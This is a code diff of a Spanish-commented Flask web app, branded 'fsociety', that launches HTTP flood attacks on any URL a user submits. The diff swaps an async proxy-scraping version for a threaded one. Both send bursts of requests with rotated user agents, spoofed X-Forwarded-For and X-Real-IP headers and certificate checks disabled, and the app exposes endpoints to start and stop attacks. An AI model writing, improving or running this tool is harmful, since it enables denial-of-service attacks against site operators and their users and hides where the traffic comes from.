@@ -1,18 +1,14 @@
 from flask import Flask, render_template, request, jsonify, session
-import asyncio
-import aiohttp
+import requests
 import random
-import re
-import itertools
-import string
-import time
 import threading
-import os
+import time
+import concurrent.futures
 
 app = Flask(__name__)
 app.secret_key = 'fsociety_hardcore_2024'
 
-# USER AGENTS MASIVOS (reducidos para hosting)
+# USER AGENTS MASIVOS
 user_agents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -20,15 +16,6 @@ user_agents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
-]
-
-# PROXY SOURCES REALES
-proxy_sources = [
-    "https://www.us-proxy.org",
-    "https://www.socks-proxy.net",
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt"
 ]
 
 class AttackManager:
@@ -42,91 +29,61 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-async def fetch_ip_addresses(url):
+def send_single_request(target_url, request_num):
+    """Envía una sola request"""
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, timeout=10, ssl=False) as response:
-                text = await response.text()
-                ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
-                return ip_addresses
-    except:
-        return []
-
-async def get_all_ips():
-    tasks = [fetch_ip_addresses(url) for url in proxy_sources]
-    ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
+            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Cache-Control": "no-cache",
+            "Connection": "keep-alive",
+            "Referer": "https://www.google.com/",
+            "DNT": "1"
+        }
+        
+        response = requests.get(target_url, headers=headers, timeout=5, verify=False)
+        return f"🔥 Request {request_num} | Status: {response.status_code} | Target: {target_url}"
     
-    all_ips = []
-    for sublist in ip_lists:
-        if isinstance(sublist, list):
-            all_ips.extend(sublist)
-    
-    # Generar IPs falsas como respaldo
-    fake_ips = [f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(200)]
-    all_ips.extend(fake_ips)
-    
-    return all_ips
-
-async def send_request(session, target_url, ip_address):
-    headers = {
-        "User-Agent": random.choice(user_agents),
-        "X-Forwarded-For": ip_address,
-        "X-Real-IP": ip_address,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Cache-Control": "no-cache",
-        "Connection": "keep-alive",
-        "Referer": "https://www.google.com/",
-        "DNT": "1"
-    }
-    
-    try:
-        async with session.get(target_url, headers=headers, timeout=5, ssl=False) as response:
-            return f"🔥 {target_url} | IP: {ip_address} | Status: {response.status}"
     except Exception as e:
-        return f"💥 {target_url} | IP: {ip_address} | Error: {type(e).__name__}"
+        return f"💥 Request {request_num} | Error: {type(e).__name__} | Target: {target_url}"
 
-async def run_attack(target_url, num_requests, attack_id, log_callback):
-    max_concurrent = 50  # Reducido para hosting
+def run_attack(target_url, num_requests, attack_id, log_callback):
+    """Ejecuta el ataque con threading"""
+    max_workers = 20  # Threads simultáneos
     
-    ip_list = await get_all_ips()
-    if not ip_list:
-        ip_list = [f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(100)]
-    
-    ip_cycle = itertools.cycle(ip_list)
-    requests_per_worker = max(1, num_requests // max_concurrent)
-
-    async def worker():
-        connector = aiohttp.TCPConnector(limit=0, ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            for _ in range(requests_per_worker):
-                if attack_id not in attack_manager.active_attacks:
-                    break
-                    
-                message = await send_request(session, target_url, next(ip_cycle))
-                log_callback(message)
-                await asyncio.sleep(0.1)  # Delay entre requests
+    def worker(batch_requests):
+        for req_num in batch_requests:
+            if attack_id not in attack_manager.active_attacks:
+                break
+                
+            message = send_single_request(target_url, req_num)
+            log_callback(message)
+            time.sleep(0.1)  # Pequeño delay entre requests
 
     start_time = time.time()
     
-    # Crear workers
-    workers = min(max_concurrent, num_requests)
-    tasks = [worker() for _ in range(workers)]
+    # Dividir requests entre workers
+    requests_per_worker = max(1, num_requests // max_workers)
+    all_requests = list(range(1, num_requests + 1))
     
-    try:
-        await asyncio.gather(*tasks)
-    except Exception as e:
-        log_callback(f"❌ Attack error: {str(e)}")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Dividir en batches
+        batches = [all_requests[i:i + requests_per_worker] for i in range(0, num_requests, requests_per_worker)]
+        
+        # Ejecutar todos los batches
+        futures = [executor.submit(worker, batch) for batch in batches]
+        concurrent.futures.wait(futures)
     
     elapsed_time = time.time() - start_time
-    log_callback(f"✅ ATTACK COMPLETED - Time: {elapsed_time:.2f}s - Target: {target_url}")
+    log_callback(f"✅ ATTACK COMPLETED - Time: {elapsed_time:.2f}s - Total Requests: {num_requests}")
 
 def start_attack_thread(target_url, num_requests, attack_id, log_callback):
-    def run_async():
-        asyncio.run(run_attack(target_url, num_requests, attack_id, log_callback))
-    
-    thread = threading.Thread(target=run_async)
+    """Inicia el ataque en un thread separado"""
+    thread = threading.Thread(target=run_attack, args=(target_url, num_requests, attack_id, log_callback))
     thread.daemon = True
     thread.start()
 
@@ -143,13 +100,11 @@ def start_attack():
     if not target_url:
         return jsonify({'error': 'Target URL required'}), 400
     
-    # Validar URL
     if not target_url.startswith(('http://', 'https://')):
         target_url = 'https://' + target_url
     
     attack_id = attack_manager.generate_attack_id()
     
-    # Inicializar logs en sesión
     if 'attack_logs' not in session:
         session['attack_logs'] = {}
     
@@ -189,5 +144,4 @@ def stop_attack(attack_id):
     return jsonify({'message': 'Attack stopped'})
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=False)
